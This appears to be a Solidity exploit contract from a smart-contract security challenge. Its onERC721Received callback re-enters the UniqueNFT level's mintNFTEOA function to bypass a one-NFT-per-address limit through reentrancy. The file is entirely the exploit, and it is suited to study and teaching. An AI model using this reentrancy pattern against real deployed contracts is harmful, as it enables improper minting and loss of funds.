// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { IERC721Receiver } from "openzeppelin/token/ERC721/IERC721Receiver.sol";
import { UniqueNFT } from "../levels/UniqueNFT.sol";

contract UniqueNFTAttack is IERC721Receiver{

    bool public entered;

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if(!entered){
            entered = true;
            UniqueNFT(msg.sender).mintNFTEOA();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}